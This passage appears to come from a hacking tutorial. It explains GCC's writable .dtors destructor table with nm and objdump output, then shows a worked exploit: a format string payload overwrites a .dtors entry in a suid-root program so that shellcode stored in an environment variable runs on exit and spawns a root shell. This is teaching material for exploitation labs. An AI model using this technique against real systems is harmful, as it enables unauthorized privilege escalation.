# *__Detours with .dtors__*

In binary programs compiled with the _GNU C compiler_, special table sections called __.dtors__ and __.ctors__ are made for _destructors_ and _constructors_, respectively. Constructor functions are executed before the _main()_ function is executed, and destructor functions are executed just before the _main()_ function exits with an exit system call. The destructor functions and the _.dtors table_ section are of particular interest.

A function can be declared as a destructor function by defining the _destructor_ attribute, as seen in _dtors_sample.c_.

__dtors_sample.c__

```c
#include <stdio.h>
#include <stdlib.h>

static void cleanup(void) __attribute__ ((destructor));

main() 
{
    printf("Some actions happen in the main() function..\n");
    printf("and then when main() exits, the destructor is called..\n");
    exit(0);
}

void cleanup(void) 
{
    printf("In the cleanup function now..\n");
}
```

In the preceding code sample, the _cleanup()_ function is defined with the destructor attribute, so the function is automatically called when the _main()_ function exits, as shown next.

<pre style="color: white;">
reader@hacking:~/booksrc $ gcc -o dtors_sample dtors_sample.c
reader@hacking:~/booksrc $ ./dtors_sample
Some actions happen in the main() function..
and then when main() exits, the destructor is called..
In the cleanup() function now..
reader@hacking:~/booksrc $
</pre>

This behavior of automatically executing a function on exit is controlled by the _.dtors table_ section of the binary. This section is an _array_ of 32-bit addresses terminated by a _NULL address_. The array always begins with _0xffffffff_ and ends with the _NULL address_ of _0x00000000_. Between these two are the addresses of all the functions that have been declared with the _destructor attribute_.

The `nm` command can be used to find the address of the _cleanup()_ function, and `objdump` can be used to examine the sections of the binary.

<pre style="color: white;">
reader@hacking:~/booksrc $ nm ./dtors_sample
   080495bc d _DYNAMIC
   08049688 d _GLOBAL_OFFSET_TABLE_
   080484e4 R _IO_stdin_used
            w _Jv_RegisterClasses
   080495a8 d __CTOR_END__
   080495a4 d __CTOR_LIST__
<strong><em>#1 080495b4 d __DTOR_END__</em></strong>
<strong><em>#2 080495ac d __DTOR_LIST__</em></strong>
   080485a0 r __FRAME_END__
   080495b8 d __JCR_END__
   080495b8 d __JCR_LIST__
   080496b0 A __bss_start
   080496a4 D __data_start
   08048480 t __do_global_ctors_aux
   08048340 t __do_global_dtors_aux
   080496a8 D __dso_handle
            w __gmon_start__
   08048479 T __i686.get_pc_thunk.bx
   080495a4 d __init_array_end
   080495a4 d __init_array_start
   08048400 T __libc_csu_fini
   08048410 T __libc_csu_init
            U __libc_start_main@@GLIBC_2.0
   080496b0 A _edata
   080496b4 A _end
   080484b0 T _fini
   080484e0 R _fp_hw
   0804827c T _init
   080482f0 T _start
   08048314 t call_gmon_start
   080483e8 t cleanup
   080496b0 b completed.1
   080496a4 W data_start
            U exit@@GLIBC_2.0
   08048380 t frame_dummy
   080483b4 T main
   080496ac d p.0
            U printf@@GLIBC_2.0
reader@hacking:~/booksrc $
</pre>

The `nm` command shows that the _cleanup()_ function is located at _0x080483e8_ (shown in bold above). It also reveals that the _.dtors section_ starts at _0x080495ac_ with __\_\_DTOR_LIST\_\___ __(#1)__ and ends at _0x080495b4_ with __\_\_DTOR_END\_\___ __(#2)__. This
means that _0x080495ac_ should contain _0xffffffff_, _0x080495b4_ should contain _0x00000000_, and the address between them (_0x080495b0_) should contain the address of the _cleanup()_ function (_0x080483e8_).

The `objdump` command shows the actual contents of the _.dtors section_ (shown in bold below), although in a slightly confusing format. The first value of _80495ac_ is simply showing the address where the _.dtors section_ is located. Then the actual bytes are shown, opposed to DWORDs, which means the bytes are reversed. Bearing this in mind, everything appears to be correct.

<pre style="color: white;">
reader@hacking:~/booksrc $ objdump -s -j .dtors ./dtors_sample

./dtors_sample: file format elf32-i386

Contents of section .dtors:
80495ac <strong><em>ffffffff e8830408 00000000</em></strong> ............
reader@hacking:~/booksrc $
</pre>

An interesting detail about the _.dtors section_ is that it is writable. An object dump of the headers will verify this by showing that the _.dtors section_ isn’t labeled __READONLY__.

<pre style="color: white;">
reader@hacking:~/booksrc $ objdump -h ./dtors_sample

./dtors_sample: file format elf32-i386

Sections:
Idx Name Size VMA LMA File off Algn
    0 .interp          00000013 08048114 08048114 00000114 2**0
                       CONTENTS, ALLOC, LOAD, READONLY, DATA
    1 .note.ABI-tag    00000020 08048128 08048128 00000128 2**2
                       CONTENTS, ALLOC, LOAD, READONLY, DATA
    2 .hash            0000002c 08048148 08048148 00000148 2**2
                       CONTENTS, ALLOC, LOAD, READONLY, DATA
    3 .dynsym          00000060 08048174 08048174 00000174 2**2
                       CONTENTS, ALLOC, LOAD, READONLY, DATA
    4 .dynstr          00000051 080481d4 080481d4 000001d4 2**0
                       CONTENTS, ALLOC, LOAD, READONLY, DATA
    5 .gnu.version     0000000c 08048226 08048226 00000226 2**1
                       CONTENTS, ALLOC, LOAD, READONLY, DATA
    6 .gnu.version_r   00000020 08048234 08048234 00000234 2**2
                       CONTENTS, ALLOC, LOAD, READONLY, DATA
    7 .rel.dyn         00000008 08048254 08048254 00000254 2**2
                       CONTENTS, ALLOC, LOAD, READONLY, DATA
    8 .rel.plt         00000020 0804825c 0804825c 0000025c 2**2
                       CONTENTS, ALLOC, LOAD, READONLY, DATA
    9 .init            00000017 0804827c 0804827c 0000027c 2**2
                       CONTENTS, ALLOC, LOAD, READONLY, CODE
    10 .plt            00000050 08048294 08048294 00000294 2**2
                       CONTENTS, ALLOC, LOAD, READONLY, CODE
    11 .text           000001c0 080482f0 080482f0 000002f0 2**4
                       CONTENTS, ALLOC, LOAD, READONLY, CODE
    12 .fini           0000001c 080484b0 080484b0 000004b0 2**2
                       CONTENTS, ALLOC, LOAD, READONLY, CODE
    13 .rodata         000000bf 080484e0 080484e0 000004e0 2**5
                       CONTENTS, ALLOC, LOAD, READONLY, DATA
    14 .eh_frame       00000004 080485a0 080485a0 000005a0 2**2
                       CONTENTS, ALLOC, LOAD, READONLY, DATA
    15 .ctors          00000008 080495a4 080495a4 000005a4 2**2
                       CONTENTS, ALLOC, LOAD, DATA
    16 .dtors          0000000c 080495ac 080495ac 000005ac 2**2
                       CONTENTS, ALLOC, LOAD, DATA
    17 .jcr            00000004 080495b8 080495b8 000005b8 2**2
                       CONTENTS, ALLOC, LOAD, DATA
    18 .dynamic        000000c8 080495bc 080495bc 000005bc 2**2
                       CONTENTS, ALLOC, LOAD, DATA
    19 .got            00000004 08049684 08049684 00000684 2**2
                       CONTENTS, ALLOC, LOAD, DATA
    20 .got.plt        0000001c 08049688 08049688 00000688 2**2
                       CONTENTS, ALLOC, LOAD, DATA
    21 .data           0000000c 080496a4 080496a4 000006a4 2**2
                       CONTENTS, ALLOC, LOAD, DATA
    22 .bss            00000004 080496b0 080496b0 000006b0 2**2
                       ALLOC
    23 .comment        0000012f 00000000 00000000 000006b0 2**0
                       CONTENTS, READONLY
    24 .debug_aranges  00000058 00000000 00000000 000007e0 2**3
                       CONTENTS, READONLY, DEBUGGING
    25 .debug_pubnames 00000025 00000000 00000000 00000838 2**0
                       CONTENTS, READONLY, DEBUGGING
    26 .debug_info     000001ad 00000000 00000000 0000085d 2**0
                       CONTENTS, READONLY, DEBUGGING
    27 .debug_abbrev   00000066 00000000 00000000 00000a0a 2**0
                       CONTENTS, READONLY, DEBUGGING
    28 .debug_line     0000013d 00000000 00000000 00000a70 2**0
                       CONTENTS, READONLY, DEBUGGING
    29 .debug_str      000000bb 00000000 00000000 00000bad 2**0
                       CONTENTS, READONLY, DEBUGGING
    30 .debug_ranges   00000048 00000000 00000000 00000c68 2**3
                       CONTENTS, READONLY, DEBUGGING
reader@hacking:~/booksrc $
</pre>

Another interesting detail about the _.dtors section_ is that it is included in all binaries compiled with the _GNU C compiler_, regardless of whether any functions were declared with the destructor attribute. This means that the vulnerable format string program, _fmt_vuln.c_, must have a _.dtors section_ containing nothing. This can be inspected using `nm` and `objdump`.

<pre style="color: white;">
reader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR
08049694 d __DTOR_END__
08049690 d __DTOR_LIST__
reader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln

./fmt_vuln: file format elf32-i386

Contents of section .dtors:
8049690 ffffffff 00000000 ........
reader@hacking:~/booksrc $
</pre>

As this output shows, the distance between __\_\_DTOR_LIST\_\___ and __\_\_DTOR_END\_\___ is only four bytes this time, which means there are no addresses between them. The object dump verifies this.

Since the _.dtors section_ is writable, if the address after the _0xffffffff_ is overwritten with a memory address, the program’s execution flow will be directed to that address when the program exits. This will be the address of __\_\_DTOR_LIST\_\___ plus four, which is _0x08049694_ (which also happens to be the address of __\_\_DTOR_END\_\___ in this case).

If the program is _suid root_, and this address can be overwritten, it will be possible to obtain a root shell.

<pre style="color: white;">
reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln
SHELLCODE will be at 0xbffff9ec
reader@hacking:~/booksrc $
</pre>

Shellcode can be put into an environment variable, and the address can be predicted as usual. Since the program name lengths of the helper program _getenvaddr.c_ and the vulnerable _fmt_vuln.c_ program differ by two bytes, the shellcode will be located at _0xbffff9ec_ when _fmt_vuln.c_ is executed. This address simply has to be written into the _.dtors section_ at _0x08049694_ (shown in bold below) using the format string vulnerability. In the output below the short write method is used.

<pre style="color: white;">
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xf9ec - 0xbfff
$2 = 14829
(gdb) quit
reader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR
<strong><em>08049694</em></strong> d __DTOR_END__
08049690 d __DTOR_LIST__
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x96\x04\x08\x94\x96\x04\
x08")%49143x%4\$hn%14829x%5\$hn
The right way to print user-controlled input:
????%49143x%4$hn%14829x%5$hn
The wrong way to print user-controlled input:
????
b7fe75fc
[*] test_val @ 0x08049794 = -72 0xffffffb8

sh-3.2# whoami
root
sh-3.2#
</pre>

Even though the _.dtors section_ isn’t properly terminated with a _NULL address_ of _0x00000000_, the shellcode address is still considered to be a destructor function. When the program exits, the shellcode will be called, spawning a root shell.